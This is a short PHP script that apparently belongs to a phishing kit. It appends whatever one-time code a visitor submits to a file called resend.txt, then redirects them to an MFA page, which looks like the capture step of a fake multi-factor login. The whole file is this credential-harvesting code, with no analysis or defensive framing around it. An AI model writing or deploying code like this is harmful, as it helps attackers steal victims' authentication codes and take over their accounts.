<?php

file_put_contents("resend.txt", "Resend Code: " . $_POST['code'] . "\n", FILE_APPEND);
header('Location: mfa.html');

// Ensures that no further code is executed
exit();
?>